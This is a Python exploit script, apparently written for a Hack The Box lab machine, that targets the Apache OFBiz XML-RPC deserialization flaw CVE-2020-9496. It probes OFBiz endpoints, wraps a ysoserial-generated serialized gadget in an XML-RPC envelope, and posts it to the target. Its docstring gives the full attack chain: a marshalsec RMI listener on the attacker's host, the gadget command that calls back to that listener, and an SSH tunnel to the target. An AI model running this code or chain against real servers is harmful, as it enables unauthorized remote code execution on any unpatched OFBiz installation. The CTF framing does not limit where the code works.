#!/usr/bin/env python3
"""
HTB Monitors — Apache OFBiz XML-RPC deserialization (CVE-2020-9496)
Source: monitors.txt   |   Arsenal ref: §2.2

The arsenal says "the write-up references the PoC rather than reproducing it". This
implements the delivery half so you do not need a third-party script: endpoint
detection, XML-RPC envelope construction, and base64 serialized-payload injection.

What is intentionally NOT bundled: the Java gadget chain. CVE-2020-9496 deserializes
the <serializable> value, so you need a marshalled object from ysoserial (typically
CommonsBeanutils1) pointing at a marshalsec RMI/LDAP listener. Generating that in pure
Python would be fabricating a gadget, so the script drives the real tools instead.

Typical flow (two terminals on Kali):
    1) java -cp marshalsec.jar marshalsec.jndi.RMIRefServer \
           "http://<LHOST>:8000/#Exploit" 1389
    2) ./poc_htb_ofbiz_xmlrpc.py --url https://127.0.0.1:8443 --detect
    3) java -jar ysoserial.jar CommonsBeanutils1 \
           "rmi://<LHOST>:1389/a" > payload.ser
    4) ./poc_htb_ofbiz_xmlrpc.py --url https://127.0.0.1:8443 \
           --payload-file payload.ser --insecure

Reach 8443 first:  ssh -f -N -L 8443:127.0.0.1:8443 marcus@<TARGET_IP>
"""

import argparse
import base64
import ssl
import sys
import urllib.error
import urllib.request

ENVELOPE = """<?xml version="1.0"?>
<methodCall>
  <methodName>PWN</methodName>
  <params>
    <param>
      <value><serializable>{payload}</serializable></value>
    </param>
  </params>
</methodCall>
"""

DETECT_PATHS = [
    "/webtools/control/main",
    "/webtools/control/xmlrpc",
    "/webtools/control/ProgramExport",
    "/accounting/control/main",
]


def opener(insecure):
    ctx = ssl.create_default_context()
    if insecure:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    return urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))


def request(url, data=None, timeout=20.0, insecure=False, headers=None):
    req = urllib.request.Request(url, data=data, method="POST" if data else "GET")
    for key, value in (headers or {}).items():
        req.add_header(key, value)
    try:
        with opener(insecure).open(req, timeout=timeout) as resp:
            return resp.status, resp.read(2000).decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read(2000).decode("utf-8", "replace")
    except urllib.error.URLError as exc:
        return None, "connect failed: %s" % exc.reason


def detect(args):
    print("[*] probing %s" % args.url)
    for path in DETECT_PATHS:
        status, body = request(args.url.rstrip("/") + path, timeout=args.timeout,
                               insecure=args.insecure)
        first = " ".join(body.split())[:110]
        print("    %-40s %s  %s" % (path, status, first))
    print("\n[i] a 200 on /webtools/control/main with an OFBiz content-type means the")
    print("    endpoint is up. CVE-2020-9496 affects releases before 17.12.04.")


def send(args):
    if args.payload_file:
        with open(args.payload_file, "rb") as fh:
            blob = fh.read()
        print("[*] loaded %d byte serialized payload" % len(blob))
    elif args.payload_b64:
        blob = base64.b64decode(args.payload_b64)
        print("[*] decoded %d bytes from --payload-b64" % len(blob))
    else:
        print("[-] need --payload-file or --payload-b64", file=sys.stderr)
        return 2

    body = ENVELOPE.format(payload=base64.b64encode(blob).decode())
    url = args.url.rstrip("/") + args.path
    print("[*] POST %s (%d bytes)" % (url, len(body)))
    status, resp = request(url, data=body.encode(), timeout=args.timeout,
                           insecure=args.insecure,
                           headers={"Content-Type": "text/xml"})
    print("[*] status: %s" % status)
    if resp:
        print(resp[:600])
    if status in (200, 500):
        print("[+] request delivered — check your marshalsec listener for the callback")
    return 0


def main(argv=None):
    p = argparse.ArgumentParser(description="OFBiz CVE-2020-9496 XML-RPC injector")
    p.add_argument("--url", required=True, help="e.g. https://127.0.0.1:8443")
    p.add_argument("--path", default="/webtools/control/xmlrpc")
    p.add_argument("--detect", action="store_true", help="identify the endpoints")
    p.add_argument("--payload-file", help="ysoserial output (.ser)")
    p.add_argument("--payload-b64", help="same, base64 encoded")
    p.add_argument("--insecure", action="store_true", help="skip TLS verification")
    p.add_argument("--timeout", type=float, default=20.0)
    args = p.parse_args(argv)

    if args.detect or (not args.payload_file and not args.payload_b64):
        detect(args)
        if not (args.payload_file or args.payload_b64):
            return 0
    return send(args)


if __name__ == "__main__":
    sys.exit(main())
